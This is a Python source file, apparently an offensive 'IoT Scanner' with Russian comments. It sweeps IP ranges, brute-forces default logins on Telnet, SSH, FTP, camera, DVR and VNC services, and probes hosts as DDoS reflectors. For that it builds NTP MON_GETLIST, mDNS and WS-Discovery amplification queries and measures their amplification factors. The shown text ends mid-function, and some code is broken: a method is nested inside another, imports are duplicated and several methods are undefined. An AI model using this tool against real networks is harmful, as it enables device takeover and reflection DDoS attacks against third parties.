#!/usr/bin/env python3
"""
IoT Scanner with Amplification Detection and Brute Force
"""

import socket
import threading
import ipaddress
import time
import concurrent.futures
from datetime import datetime
import struct
import random
import requests
from requests.auth import HTTPBasicAuth
import ftplib
import telnetlib3
import subprocess
import sys
import base64  # используется в нескольких методах
import asyncio # для CoAP
from aiocoap import Context, Message
from pymodbus.client import ModbusTcpClient
from snap7.client import Client
import paho.mqtt.client as mqtt
import importlib.util
import shutil
import os
from Crypto.Cipher import DES
import pymssql
import vncdotool
# Многие импорты могут отсутствовать:
from aiocoap import Context, Message  # CoAP
from pymodbus.client import ModbusTcpClient  # Modbus
from snap7.client import Client  # Siemens S7
import vncdotool  # VNC
import pymssql  # Базы данных
import websocket
import json
import mysql.connector
import psycopg2
import hashlib



# Отключение предупреждений о небезопасных HTTPS запросах
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Отключение предупреждений requests
import warnings
warnings.filterwarnings('ignore')



class TestResult:
    def __init__(self, ip, port, service, vulnerability="Не обнаружена", credentials="Не найдены"):
        self.ip = ip
        self.port = port
        self.service = service
        self.vulnerability = vulnerability
        self.credentials = credentials

class AmplificationResult:
    def __init__(self, ip, port, protocol, amplification_factor, is_vulnerable):
        self.ip = ip
        self.port = port
        self.protocol = protocol
        self.amplification_factor = amplification_factor
        self.is_vulnerable = is_vulnerable

class IoTScanner:
    def __init__(self, max_workers=None):

        self.MAX_BRUTE_TIME = 750

        self.protocols = {
        "23": "Telnet Router", 
        "2323": "Telnet Router", 
        "2000": "Telnet Router", 
        "22": "SSH Router",
        "222": "SSH Router",
        "2222": "SSH Router",
        "7547": "TR-069",
        "8443": "HTTPS Admin",
        "8080": "HTTP Admin", 
        "80": "HTTP Camera",
        "443": "HTTPS Camera", 
        "8088": "HTTP Camera",
        "9000": "HTTP Camera",
        "8000": "HTTP Camera Alt",
        "8888": "HTTP DVR",
        "8081": "HTTP",
        "8001": "HTTP",
        "8008": "HTTP",
        "8009": "HTTP",
        "8883": "MQTT SSL",
        "5060": "SIP",                # UDP основной + TCP версия
        "5683": "CoAP",               # UDP основной + TCP версия
        "21": "FTP Router",
        "34567": "Hikvision", 
        "554": "Hikvision", 
        "8554": "Hikvision", 
        "37777": "Dahua",
        "37778": "Dahua",
        "555": "Dahua",
        "37775": "Dahua Alt",
        "34599": "Hikvision Alt",

        "1900": "SSDP",
        "53": "DNS",
        "11211": "memcached",

        "5900": "VNC",
        "5901": "VNC Alt",     
        
        }
        
        self.amplification_protocols = {
            "53": "dns",
            "1900": "ssdp", 
            "3702": "WS-Discovery",            
            "11211": "memcached",
            "389": "cldap",
            "443": "quic",
            "5683": "CoAP"
        }
        
        self.vulnerabilities = {
            "default_creds": "Default credentials",
            "amplification": "Amplification DDoS"
        }



        # 🔥 ПРОСТАЯ ЛОГИКА ДЛЯ MAX_WORKERS
        if max_workers is not None:
            self.Max_workers = max_workers
            print(f"[SCANNER] Ручная настройка: Max_workers = {self.Max_workers}")
        else:
            self.Max_workers = self.get_optimal_max_workers()
            print(f"[SCANNER] Автонастройка завершена. Max_workers = {self.Max_workers}")
        
        # Остальной код без изменений     
        self.ranges = []
        self.credentials = []
        self.scanned_ips = 0
        self.total_ips = 0
        self.current_range = ""
        self.start_time = None
        self.lock = threading.Lock()
        
        self.common_ports = self.protocols
        self.amplification_only = False
        self.target = None
        self.scan_mode = "iot_only"  # Добавить значение по умолчанию
        
        print(f"[SCANNER] Автонастройка завершена. Max_workers = {self.Max_workers}")


        self.common_ports = self.protocols
        self.amplification_only = False  # для совместимости
        self.target = None  # для совместимости
        
    def get_optimal_max_workers(self):
        """Точная автонастройка max_workers по характеристикам системы"""
        import multiprocessing
        import psutil
        import os
        import subprocess
        import platform
        
        try:
            # === ОСНОВНЫЕ ХАРАКТЕРИСТИКИ ===
            cpu_cores = multiprocessing.cpu_count()
            memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            system_type = platform.system()
            
            # === ДЕТАЛЬНАЯ ИНФОРМАЦИЯ О CPU ===
            cpu_info = self._get_detailed_cpu_info()
            cpu_physical_cores = cpu_info.get('physical_cores', cpu_cores)
            cpu_threads = cpu_info.get('logical_cores', cpu_cores)
            cpu_freq_max = cpu_info.get('max_freq', 2.0)
            cpu_arch = cpu_info.get('architecture', 'x64')
            
            # === ДЕТАЛЬНАЯ ИНФОРМАЦИЯ О ПАМЯТИ ===
            memory_info = self._get_detailed_memory_info()
            memory_available_gb = memory_info.get('available_gb', memory_gb)
            memory_used_percent = memory_info.get('used_percent', 0)
            swap_used = memory_info.get('swap_used', False)
            
            # === ДЕТАЛЬНАЯ ИНФОРМАЦИЯ О ДИСКЕ ===
            disk_info = self._get_detailed_disk_info()
            disk_type = disk_info.get('type', 'HDD')
            disk_speed = disk_info.get('speed', 'slow')
            free_space_gb = disk_info.get('free_space_gb', 10)
            
            # === ДЕТАЛЬНАЯ ИНФОРМАЦИЯ О СЕТИ ===
            network_info = self._get_detailed_network_info()
            network_speed = network_info.get('speed', 'medium')
            network_latency = network_info.get('latency', 'high')
            connection_type = network_info.get('type', 'ethernet')
            
            # === СИСТЕМНАЯ НАГРУЗКА ===
            system_load = self._get_system_load()
            cpu_load = system_load.get('cpu_percent', 0)
            memory_pressure = system_load.get('memory_pressure', 0)
            
            print(f"[SYSTEM] CPU: {cpu_physical_cores}P/{cpu_threads}L {cpu_freq_max:.1f}GHz {cpu_arch}")
            print(f"[SYSTEM] RAM: {memory_available_gb:.1f}GB доступно ({memory_used_percent:.1f}% использовано)")
            print(f"[SYSTEM] Disk: {disk_type} {disk_speed}, {free_space_gb:.1f}GB свободно")
            print(f"[SYSTEM] Network: {connection_type} {network_speed}, latency: {network_latency}")
            print(f"[SYSTEM] Load: CPU {cpu_load:.1f}%, Memory pressure: {memory_pressure:.1f}%")

            # === БАЗОВЫЙ РАСЧЕТ ПО CPU ===
            # Учитываем физические ядра, гипертрединг и частоту
            cpu_base = cpu_physical_cores
            
            # Множитель частоты (база 2.0 GHz = 1.0)
            freq_multiplier = 1.0 + (cpu_freq_max - 2.0) * 0.3
            
            # Бонус за гипертрединг (30% эффективности)
            hyperthreading_bonus = (cpu_threads - cpu_physical_cores) * 0.3 if cpu_threads > cpu_physical_cores else 0
            
            # Архитектурные бонусы
            arch_bonus = 1.2 if cpu_arch in ['x86_64', 'AMD64'] else 1.0
            
            base_workers = int(cpu_base * 8 * freq_multiplier * arch_bonus + hyperthreading_bonus * 10)
            
            # === КОРРЕКТИРОВКА ПО ПАМЯТИ ===
            # Базовый расчет: 1GB RAM = 15 workers
            memory_base = memory_available_gb * 15
            
            # Штраф за использование памяти
            memory_penalty = max(0, (memory_used_percent - 70) * 0.5) if memory_used_percent > 70 else 0
            
            # Штраф за использование swap
            swap_penalty = 20 if swap_used else 0
            
            memory_workers = memory_base - memory_penalty - swap_penalty
            
            # === КОРРЕКТИРОВКА ПО ДИСКУ ===
            disk_multipliers = {
                ('SSD', 'fast'): 1.3,
                ('SSD', 'medium'): 1.2,
                ('SSD', 'slow'): 1.1,
                ('NVMe', 'fast'): 1.5,
                ('NVMe', 'medium'): 1.4,
                ('NVMe', 'slow'): 1.3,
                ('HDD', 'fast'): 1.0,
                ('HDD', 'medium'): 0.9,
                ('HDD', 'slow'): 0.8
            }
            
            disk_multiplier = disk_multipliers.get((disk_type, disk_speed), 1.0)
            
            # Штраф за малое свободное место
            space_penalty = 0
            if free_space_gb < 1:
                space_penalty = 30
            elif free_space_gb < 5:
                space_penalty = 15
            
            # === КОРРЕКТИРОВКА ПО СЕТИ ===
            network_multipliers = {
                ('ethernet', 'fast', 'low'): 1.3,
                ('ethernet', 'fast', 'medium'): 1.2,
                ('ethernet', 'fast', 'high'): 1.1,
                ('ethernet', 'medium', 'low'): 1.1,
                ('ethernet', 'medium', 'medium'): 1.0,
                ('ethernet', 'medium', 'high'): 0.9,
                ('wifi', 'fast', 'low'): 1.1,
                ('wifi', 'fast', 'medium'): 1.0,
                ('wifi', 'fast', 'high'): 0.9,
                ('wifi', 'medium', 'low'): 1.0,
                ('wifi', 'medium', 'medium'): 0.9,
                ('wifi', 'medium', 'high'): 0.8,
                ('mobile', 'fast', 'low'): 0.9,
                ('mobile', 'fast', 'medium'): 0.8,
                ('mobile', 'fast', 'high'): 0.7,
            }
            
            network_multiplier = network_multipliers.get((connection_type, network_speed, network_latency), 1.0)
            
            # === КОРРЕКТИРОВКА ПО НАГРУЗКЕ СИСТЕМЫ ===
            load_penalty = 0
            if cpu_load > 80:
                load_penalty = 30
            elif cpu_load > 60:
                load_penalty = 15
            elif cpu_load > 40:
                load_penalty = 5
                
            if memory_pressure > 80:
                load_penalty += 20
            elif memory_pressure > 60:
                load_penalty += 10
            
            # === ФИНАЛЬНЫЙ РАСЧЕТ ===
            optimal = int(
                (base_workers + memory_workers) * 
                disk_multiplier * 
                network_multiplier - 
                load_penalty - 
                space_penalty
            )
            
            # === ИНТЕЛЛЕКТУАЛЬНЫЕ ОГРАНИЧЕНИЯ ===
            
            # Ограничения по CPU архитектуре
            cpu_limits = {
                'ARM': 100,  # Raspberry Pi и мобильные CPU
                'x86': 200,  # Старые 32-битные системы
                'x86_64': 800,  # Современные 64-битные
                'AMD64': 1000   # Серверные системы
            }
            optimal = min(optimal, cpu_limits.get(cpu_arch, 500))
            
            # Ограничения по операционной системе
            os_limits = {
                'Windows': 800,
                'Linux': 1000,
                'Darwin': 600  # macOS
            }
            optimal = min(optimal, os_limits.get(system_type, 500))
            
            # Ограничения по памяти (строгие)
            memory_limits = [
                (1, 50),    # 1GB RAM - max 50 workers
                (2, 100),   # 2GB RAM - max 100 workers  
                (4, 200),   # 4GB RAM - max 200 workers
                (8, 400),   # 8GB RAM - max 400 workers
                (12, 500),   # 12GB RAM - max 500 workers
                (16, 600),  # 16GB RAM - max 600 workers
                (32, 800),  # 32GB RAM - max 800 workers
                (64, 1000)  # 64GB+ RAM - max 1000 workers
            ]
            
            for limit_gb, limit_workers in memory_limits:
                if memory_available_gb <= limit_gb:
                    optimal = min(optimal, limit_workers)
                    break
            
            # Ограничения по количеству ядер
            core_limits = [
                (1, 50),    # 1 core - max 50 workers
                (2, 100),   # 2 cores - max 100 workers
                (4, 300),   # 4 cores - max 300 workers
                (6, 400),   # 6 cores - max 400 workers
                (8, 500),   # 8 cores - max 500 workers
                (10, 600),   # 10 cores - max 600 workers
                (12, 700),   # 12 cores - max 700 workers
                (16, 800),  # 16 cores - max 800 workers
                (32, 1000)  # 32+ cores - max 1000 workers
            ]
            
            for limit_cores, limit_workers in core_limits:
                if cpu_physical_cores <= limit_cores:
                    optimal = min(optimal, limit_workers)
                    break
            
            # Гарантированный минимум и максимум
            optimal = max(optimal, 10)   # Минимум 10 workers
            optimal = min(optimal, 50000) # Максимум 1000 workers
            
            # Финальная проверка здравого смысла
            if optimal > 300 and memory_available_gb < 4:
                optimal = 150
            if optimal > 500 and cpu_physical_cores < 4:
                optimal = 300
                
            print(f"[OPTIMAL] Рассчитано max_workers: {optimal}")
            return optimal
            
        except Exception as e:
            print(f"[WARNING] Автонастройка не удалась: {e}, используем значение по умолчанию: 100")
            return 100

    def _get_detailed_cpu_info(self):
        """Детальная информация о CPU"""
        import psutil
        import platform
        import subprocess
        
        try:
            cpu_physical = psutil.cpu_count(logical=False) or 1
            cpu_logical = psutil.cpu_count(logical=True) or 1
            
            # Частота CPU
            cpu_freq = psutil.cpu_freq()
            max_freq = cpu_freq.max if cpu_freq else 2.0
            
            # Архитектура
            arch = platform.machine()
            
            # Дополнительная информация о CPU
            cpu_name = "Unknown"
            if platform.system() == "Windows":
                try:
                    output = subprocess.check_output(
                        "wmic cpu get name", 
                        shell=True, 
                        text=True, 
                        stderr=subprocess.DEVNULL
                    )
                    lines = output.strip().split('\n')
                    if len(lines) > 1:
                        cpu_name = lines[1].strip()
                except:
                    pass
            else:
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        for line in f:
                            if line.startswith('model name'):
                                cpu_name = line.split(':', 1)[1].strip()
                                break
                except:
                    pass
            
            return {
                'physical_cores': cpu_physical,
                'logical_cores': cpu_logical,
                'max_freq': max_freq,
                'architecture': arch,
                'name': cpu_name
            }
        except:
            return {'physical_cores': 1, 'logical_cores': 1, 'max_freq': 2.0, 'architecture': 'x64'}

    def _get_detailed_memory_info(self):
        """Детальная информация о памяти"""
        import psutil
        
        try:
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            return {
                'available_gb': memory.available / (1024 ** 3),
                'used_percent': memory.percent,
                'swap_used': swap.percent > 10,
                'swap_percent': swap.percent
            }
        except:
            return {'available_gb': 4.0, 'used_percent': 50, 'swap_used': False}

    def _get_detailed_disk_info(self):
        """Детальная информация о диске"""
        import psutil
        import os
        import subprocess
        
        try:
            # Определяем тип диска
            disk_type = "HDD"
            disk_speed = "medium"
            
            if os.name == 'nt':  # Windows
                try:
                    import win32file
                    drive = os.path.splitdrive(os.path.abspath(__file__))[0]
                    drive_type = win32file.GetDriveType(drive + "\\")
                    if drive_type == win32file.DRIVE_FIXED:
                        # Проверяем SSD через PowerShell
                        try:
                            cmd = ["powershell", "-Command", 
                                  f"Get-PhysicalDisk | Where-Object {{$_.DeviceID -eq 0}} | Select-Object MediaType"]
                            result = subprocess.run(cmd, capture_output=True, text=True)
                            if "SSD" in result.stdout:
                                disk_type = "SSD"
                                disk_speed = "fast"
                        except:
                            pass
                except:
                    pass
            else:  # Linux/Mac
                try:
                    for disk in psutil.disk_partitions():
                        if disk.device == '/':
                            try:
                                with open('/sys/block/' + os.path.basename(disk.device) + '/queue/rotational', 'r') as f:
                                    if f.read().strip() == '0':
                                        disk_type = "SSD"
                                        disk_speed = "fast"
                            except:
                                # Проверяем через hdparm
                                try:
                                    result = subprocess.run(
                                        ['hdparm', '-I', '/dev/sda'], 
                                        capture_output=True, text=True
                                    )
                                    if "Solid State" in result.stdout:
                                        disk_type = "SSD"
                                        disk_speed = "fast"
                                except:
                                    pass
                except:
                    pass
            
            # Свободное место
            disk_usage = psutil.disk_usage('/')
            free_space_gb = disk_usage.free / (1024 ** 3)
            
            return {
                'type': disk_type,
                'speed': disk_speed,
                'free_space_gb': free_space_gb
            }
        except:
            return {'type': 'HDD', 'speed': 'medium', 'free_space_gb': 10}

    def _get_detailed_network_info(self):
        """Детальная информация о сети"""
        import psutil
        import subprocess
        import platform
        
        try:
            connection_type = "ethernet"
            network_speed = "medium"
            latency = "medium"
            
            # Определяем тип подключения
            if platform.system() == "Windows":
                try:
                    result = subprocess.run(
                        ["netsh", "wlan", "show", "interfaces"], 
                        capture_output=True, text=True
                    )
                    if "SSID" in result.stdout and "BSSID" in result.stdout:
                        connection_type = "wifi"
                except:
                    pass
            else:
                try:
                    result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
                    if 'wlan' in result.stdout or 'wifi' in result.stdout:
                        connection_type = "wifi"
                except:
                    pass
            
            # Оценка скорости сети через ping до известных серверов
            try:
                test_servers = ['8.8.8.8', '1.1.1.1', 'google.com']
                min_latency = float('inf')
                
                for server in test_servers:
                    param = '-n' if platform.system().lower() == 'windows' else '-c'
                    result = subprocess.run(
                        ['ping', param, '2', server], 
                        capture_output=True, text=True
                    )
                    if result.returncode == 0:
                        # Парсим время ping
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if 'time=' in line:
                                try:
                                    time_str = line.split('time=')[1].split(' ')[0]
                                    latency_ms = float(time_str)
                                    min_latency = min(min_latency, latency_ms)
                                except:
                                    pass
                
                if min_latency < 20:
                    latency = "low"
                    network_speed = "fast"
                elif min_latency < 50:
                    latency = "medium" 
                    network_speed = "medium"
                else:
                    latency = "high"
                    network_speed = "slow"
                    
            except:
                pass
            
            return {
                'type': connection_type,
                'speed': network_speed,
                'latency': latency
            }
        except:
            return {'type': 'ethernet', 'speed': 'medium', 'latency': 'medium'}

    def _get_system_load(self):
        """Текущая нагрузка системы"""
        import psutil
        
        try:
            cpu_percent = psutil.cpu_percent(interval=0.5)
            memory = psutil.virtual_memory()
            
            # "Давление" памяти (использование + готовность к использованию)
            memory_pressure = memory.percent + (memory.available / memory.total * 100) / 2
            
            return {
                'cpu_percent': cpu_percent,
                'memory_pressure': memory_pressure
            }
        except:
            return {'cpu_percent': 0, 'memory_pressure': 0}
        
    def load_ranges(self):
        """Загрузка диапазонов из range.txt"""
        try:
            with open('range.txt', 'r') as f:
                self.ranges = [line.strip() for line in f if line.strip()]
            print(f"[+] Загружено {len(self.ranges)} диапазонов")
        except FileNotFoundError:
            print("[!] Файл range.txt не найден")
            return False
        return True
    
    def load_credentials(self):
        """Загрузка логинов/паролей из pass.txt"""
        try:
            with open('pass.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        login, password = line.split(':', 1)
                        self.credentials.append((login, password))
            print(f"[+] Загружено {len(self.credentials)} пар логин:пароль")
        except FileNotFoundError:
            print("[!] Файл pass.txt не найден")
            return False
        return True

    def set_scan_mode(self, mode):
        """Установка режима сканирования"""
        valid_modes = ["combined", "iot_only", "amplification_only"]
        if mode in valid_modes:
            self.scan_mode = mode
            print(f"[INFO] Установлен режим сканирования: {mode}")
        else:
            print(f"[ERROR] Неверный режим. Допустимые: {valid_modes}")
    
    def scan_websocket_on_open_ports(self, ip, open_ports):
        """Сканирование WebSocket на открытых портах"""
        websocket_results = []
        
        # HTTP порты, которые могут иметь WebSocket
        http_ports = ["80", "443", "8080", "7547", "8088", "8888", "8443", "8000", "81", "82", "83", "84", "85", "86", "88", "8008", "8081", "8082", "8090", "8181", "8444", "8843", "9001", "3000", "5000",]
        
        for port_info in open_ports:
            port = port_info['port']
            
            # Проверяем только HTTP порты для WebSocket
            if port in http_ports:
                try:
                    # Проверяем WebSocket уязвимости
                    ws_vulnerabilities = self.check_websocket_vulnerabilities(ip, port)
                    
                    if ws_vulnerabilities:
                        result = {
                            'ip': ip,
                            'port': port,
                            'service': 'WebSocket Service',
                            'vulnerabilities': ws_vulnerabilities,
                            'type': 'websocket'
                        }
                        websocket_results.append(result)
                        
                        # Сохраняем в файл
                        with open('websocket_results.txt', 'a') as f:
                            f.write(f"{ip}:{port}:{ws_vulnerabilities}\n")
                            
                        print(f"[WEBSOCKET] {ip}:{port} - найдены уязвимости: {len(ws_vulnerabilities)}")
                        
                except Exception as e:
                    print(f"[WEBSOCKET-ERROR] {ip}:{port} - ошибка: {e}")
                    continue
        
        return websocket_results

    def check_port(self, ip, port, timeout=10):
        """Проверка открытого порта"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((str(ip), int(port)))
            sock.close()
            return result == 0
        except:
            return False

    def scan_single_target(self, target):
        """Исправленное сканирование одной цели с включением amplification проверок"""
        results = []
        
        # Сканирование обычных IoT сервисов
        for port_str, service_name in self.common_ports.items():
            port = int(port_str)
            result = None
            
            try:
                # Проверка доступности порта
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                result_code = sock.connect_ex((target, port))
                sock.close()
                    
                if result_code == 0:  # Порт открыт
                    # Тестируем сервис
                    result = self.test_service_by_type(target, port, service_name)
                    
                    if result:
                        # Брутфорс учетных данных
                        creds = self.brute_force_all_protocols(target, port, service_name)
                        if creds:
                            result.credentials = creds
                            result.vulnerability = self.vulnerabilities["default_creds"]
                        
                        # Проверка других уязвимостей
                        vuln_found = self.check_actual_vulnerability(target, port, service_name)
                        if vuln_found and result.vulnerability == "Не обнаружена":
                            result.vulnerability = vuln_found
                        
                        # ✅ ДОБАВЛЕНО: Проверка amplification уязвимости
                        amp_result = self.check_amplification_vulnerability(target, port, service_name)
                        if amp_result and amp_result.is_vulnerable:
                            result.vulnerability = f"Amplification ({amp_result.protocol} {amp_result.amplification_factor:.1f}x)"
                            self.save_amplification_result(amp_result)
                        
                        # Сохраняем если уязвимо
                        if (result.credentials != "Не найдены" or 
                            result.vulnerability != "Не обнаружена"):
                            self.save_result_to_file(result)
                        
                        results.append(result)
                            
            except Exception as e:
                continue
        
        # ✅ ДОБАВЛЕНО: Отдельное сканирование amplification протоколов для этой цели
        amp_results = self.scan_amplification_protocols(target)
        if amp_results:
            results.extend(self.convert_amplification_to_test_results(amp_results))
        
        return results

    def test_service_by_type(self, ip, port, service):
        """Заглушка для отсутствующего метода"""
        return TestResult(ip, port, service)

    def save_result_to_file(self, result):
        """Сохранение результатов"""
        with open('results.txt', 'a') as f:
            f.write(f"{result.ip}:{result.port}:{result.service}\n")

    def run_scan(self):
        """Запуск сканирования в зависимости от выбранного режима"""
        if self.scan_mode == "amplification_only":
            print("[MODE] Режим: Only Amplification")
            return self.scan_amplification_only()
        elif self.scan_mode == "iot_only":
            print("[MODE] Режим: Only IoT") 
            return self.scan_iot_only()
        else:
            print("[MODE] Режим: Combined (IoT + Amplification)")
            return self.scan_combined()

    def scan_combined(self):
        """КОРРЕКТНОЕ комбинированное сканирование"""
        print("[INFO] Запуск КОРРЕКТНОГО комбинированного сканирования...")
        all_results = []
        
        for cidr_range in self.ranges:
            try:
                network = ipaddress.ip_network(cidr_range, strict=False)
                print(f"[RANGE] Сканирование диапазона: {cidr_range}")
                
                for ip in network.hosts():
                    # 🔥 ОДНОВРЕМЕННОЕ сканирование обоих типов
                    ip_str = str(ip)
                    
                    # 1. Amplification сканирование (UDP)
                    amp_results = self.scan_amplification_for_ip(ip_str)
                    
                    # 2. IoT сканирование (TCP)  
                    iot_results = self.scan_iot_for_ip(ip_str)
                    
                    # 3. WebSocket сканирование
                    ws_results = self.scan_websocket_services(ip_str)
                    
                    # Сохраняем все результаты
                    if amp_results:
                        all_results.extend(amp_results)
                        print(f"[AMPLIFICATION] {ip_str}: найдено {len(amp_results)} уязвимостей")
                        
                    if iot_results:
                        all_results.extend(iot_results)
                        print(f"[IOT] {ip_str}: найдено {len(iot_results)} сервисов")
                        
                    if ws_results:
                        all_results.extend(ws_results)
                        print(f"[WEBSOCKET] {ip_str}: найдено {len(ws_results)} endpoints")
                        
            except Exception as e:
                print(f"[ERROR] Ошибка в диапазоне {cidr_range}: {e}")
                continue
        
        return all_results

    def scan_iot_only(self):
        """Сканирование только IoT протоколов"""
        print("[INFO] Запуск сканирования IoT протоколов...")
        results = []
        for cidr_range in self.ranges:
            try:
                network = ipaddress.ip_network(cidr_range, strict=False)
                for ip in network.hosts():
                    # Сканируем IoT сервисы
                    iot_results = self.scan_iot_for_ip(ip)
                    
                    # Сканируем WebSocket сервисы  
                    ws_results = self.scan_websocket_services(ip)
                    
                    # 🔥 ДОБАВЛЯЕМ ОБА типа результатов
                    results.extend(iot_results)
                    results.extend(ws_results)  # ✅ ЭТОЙ СТРОКИ НЕ ХВАТАЛО!
                    
            except Exception as e:
                print(f"[ERROR] Ошибка в диапазоне {cidr_range}: {e}")
        return results

    def check_amplification_vulnerability(self, ip, port, protocol):
        """Проверка конкретного порта на amplification уязвимость"""
        amplification_protocols = {
            53: self.test_dns_amplification,
            123: self.test_ntp_amplification,
            1900: self.test_ssdp_amplification,
            389: self.test_cldap_amplification,
            11211: self.test_memcached_amplification,
            161: self.test_snmp_amplification,
            19: self.test_chargen_amplification,
            17: self.test_qotd_amplification,
            5683: self.test_coap_amplification,
            443: self.test_quic_amplification,
            69: self.test_tftp_amplification
        }
        
        if port in amplification_protocols:
            return amplification_protocols[port](ip, port)
        return None

    def convert_amplification_to_test_results(self, amplification_results):
        """Конвертирует AmplificationResult в TestResult для единообразного вывода"""
        test_results = []
        for amp_result in amplification_results:
            if amp_result.is_vulnerable:
                test_result = TestResult(
                    ip=amp_result.ip,
                    port=amp_result.port,
                    service=f"{amp_result.protocol} Amplification",
                    vulnerability=f"Amplification DDoS ({amp_result.amplification_factor:.1f}x)",
                    credentials="Не найдены"
                )
                test_results.append(test_result)
        return test_results
    
    def check_udp_port(self, ip, port, timeout=10):
        """Корректная проверка UDP портов"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            query = self.create_protocol_specific_query(port)
            if not query:
                return False
                
            sock.sendto(query, (str(ip), port))
            
            try:
                response, addr = sock.recvfrom(1024)
                # ✅ Проверяем, что ответ валиден для протокола
                return self.validate_protocol_response(port, response)
            except socket.timeout:
                # ✅ Для UDP таймаут - нормальная ситуация
                return False
        except Exception:
            return False

        def test_wsdiscovery_amplification(self, ip, port=3702):
            """Тестирование WS-Discovery amplification (50-150x) - ОБНОВЛЕННАЯ ВЕРСИЯ"""
            try:
                print(f"[WS-DISCOVERY] Тестирование {ip}:{port}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # WS-Discovery probe запрос
                wsdiscovery_probe = self.create_wsdiscovery_probe()
                sent_size = len(wsdiscovery_probe)
                
                print(f"[WS-DISCOVERY] Отправка {sent_size} байт на {ip}:{port}")
                start_time = time.time()
                sock.sendto(wsdiscovery_probe, (str(ip), port))
                
                try:
                    response, addr = sock.recvfrom(8192)  # Большой буфер для WS-Discovery
                    received_size = len(response)
                    response_time = time.time() - start_time
                    
                    sock.close()
                    
                    # Проверяем валидность ответа
                    if self.validate_wsdiscovery_response(response):
                        amp_factor = received_size / sent_size
                        print(f"[WS-DISCOVERY] Успех: {sent_size} -> {received_size} байт (x{amp_factor:.2f}) за {response_time:.2f}с")
                        
                        return AmplificationResult(
                            ip=ip, port=port, protocol="WS-Discovery",
                            amplification_factor=amp_factor,
                            is_vulnerable=amp_factor >= 20.0  # WS-Discovery обычно дает высокий коэффициент
                        )
                    else:
                        print(f"[WS-DISCOVERY] Невалидный ответ от {ip}:{port}")
                        
                except socket.timeout:
                    print(f"[WS-DISCOVERY] Таймаут для {ip}:{port}")
                except Exception as e:
                    print(f"[WS-DISCOVERY] Ошибка получения ответа: {e}")
                        
            except Exception as e:
                print(f"[WS-DISCOVERY] Критическая ошибка: {e}")
            
            return AmplificationResult(ip=ip, port=port, protocol="WS-Discovery", amplification_factor=0, is_vulnerable=False)

    def test_mdns_amplification(self, ip, port=5353):
        """Тестирование mDNS amplification (2-50x)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # mDNS query для широкого диапазона сервисов
            mdns_query = self.create_mdns_amplification_query()
            sent_size = len(mdns_query)
            
            # Отправляем на multicast адрес или напрямую
            sock.sendto(mdns_query, (str(ip), port))
            response, addr = sock.recvfrom(4096)
            received_size = len(response)
            
            sock.close()
            
            # Проверяем валидность mDNS ответа
            if self.validate_mdns_response(response):
                amp_factor = received_size / sent_size
                return AmplificationResult(
                    ip=ip, port=port, protocol="mDNS",
                    amplification_factor=amp_factor,
                    is_vulnerable=amp_factor >= 5.0
                )
                
        except Exception as e:
            pass
        
        return AmplificationResult(ip=ip, port=port, protocol="mDNS", amplification_factor=0, is_vulnerable=False)

    def create_mdns_amplification_query(self):
        """Создает mDNS запрос для amplification тестирования"""
        transaction_id = random.randint(0, 65535)
        flags = 0x0000  # Standard query
        questions = 5    # Множество вопросов для усиления
        answers = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('>HHHHHH', transaction_id, flags, questions, 
                            answers, authority_rrs, additional_rrs)
        
        # Несколько PTR запросов для разных сервисов
        services = [
            "_services._dns-sd._udp.local",
            "_http._tcp.local", 
            "_printer._tcp.local",
            "_ssh._tcp.local",
            "_ipp._tcp.local"
        ]
        
        questions_section = b''
        for service in services:
            # QNAME
            parts = service.split('.')
            for part in parts:
                if part:  # Пропускаем пустые части
                    questions_section += struct.pack('B', len(part)) + part.encode()
            questions_section += b'\x00'
            
            # QTYPE = PTR (12), QCLASS = IN (1) с unicast response
            questions_section += struct.pack('>HH', 12, 0x8001)
        
        return header + questions_section

    def validate_mdns_response(self, response):
        """Валидация mDNS ответа"""
        try:
            if len(response) < 12:
                return False
                
            # Проверяем что это mDNS ответ (QR bit = 1)
            flags = struct.unpack('>H', response[2:4])[0]
            return (flags & 0x8000) == 0x8000  # QR bit
            
        except:
            return False

    def test_ntp_amplification(self, ip, port=123):
        """Тестирование NTP amplification (50-500x) с MON_GETLIST"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # NTP MON_GETLIST запрос (самый эффективный для amplification)
            ntp_monlist = self.create_ntp_monlist_query()
            sent_size = len(ntp_monlist)
            
            sock.sendto(ntp_monlist, (str(ip), port))
            response, addr = sock.recvfrom(65535)  # Очень большой буфер для NTP
            received_size = len(response)
            
            sock.close()
            
            # Проверяем валидность NTP ответа
            if self.validate_ntp_response(response):
                amp_factor = received_size / sent_size
                return AmplificationResult(
                    ip=ip, port=port, protocol="NTP",
                    amplification_factor=amp_factor,
                    is_vulnerable=amp_factor >= 30.0
                )
                
        except Exception as e:
            pass
        
        return AmplificationResult(ip=ip, port=port, protocol="NTP", amplification_factor=0, is_vulnerable=False)

    def create_ntp_monlist_query(self):
        """Создает NTP MON_GETLIST запрос"""
        return bytes([
            # NTP header
            0x17, 0x00,       # LI=0, VN=2, Mode=7 (control)
            0x03, 0x2a,       # Response/Operation = MON_GETLIST
            0x00, 0x00, 0x00, 0x00,  # Sequence number
            # Association ID = 0 (все ассоциации)
            0x00, 0x00, 0x00, 0x00,
            # Offset = 0
            0x00, 0x00, 0x00, 0x00,
            # Count = 0 (максимальный ответ)
            0x00, 0x00, 0x00, 0x00,
            # Rest of packet is zeros
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])

    def validate_ntp_response(self, response):
